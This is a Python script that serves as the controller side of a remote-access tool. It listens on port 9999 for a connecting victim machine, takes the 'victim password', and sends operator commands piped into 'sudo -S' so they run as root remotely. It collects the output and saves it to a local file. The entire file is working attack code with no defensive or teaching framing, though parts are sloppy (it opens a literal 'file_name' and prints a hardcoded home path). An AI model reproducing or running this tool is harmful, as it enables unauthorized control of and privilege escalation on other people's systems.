from socket import *
from getpass import*
import os
from time import sleep
s = socket()
ip_input = input("enter your ip address:  ")
file_name = input("plese enter path of file to dump data")
file= open('file_name','a+')
print("Socket Successfully created...>!")
port= 9999
s.bind((ip_input,port))
print("socket binded to ", port)
s.listen()
print("socket is listning......>")
cs,addr =s.accept()
print("Gotta connection from ",addr ,'with client socket',cs)
sleep(2)
print("CONNECTION ESTABLISHED WITH...",addr)
sleep(2)
def dumping(data):
    file = open('data.txt','a')
    file.write(data)
    print('Data successfully appended to /home/nexus8222/data.txt')
    file.close()
def cmd_with_pass(c,p):
    cmd_with_pass= f"echo {p} | sudo -S {c} "
    return cmd_with_pass
# pass_wrd= getpass("enter your password: ")
pass_wrd =input("enter victim password for privilage>>")


while True:
    query=input("entr command to run in remote sys: ")
    if query[0:2]=='cd':
        cs.sendall(query.encode())
    if query[0:5] == 'mkdir':
        cs.sendall(query.encode())
    

    cmd=cmd_with_pass(query,pass_wrd)
    print("you now have superuser privilage>>>")
    command = cs.sendall(cmd.encode())

    output = cs.recv(1024).decode()
    ask= input("do you wanna dump data?y/n")
    if ask.lower()=='y':
        print("writing to data.txt....")
        sleep(1)
        dumping(output)
        sleep(1)
        print('successfully dumped....>>>')
    elif ask.lower()=='n':
        print(f"THE output of {query} is {output}")
    

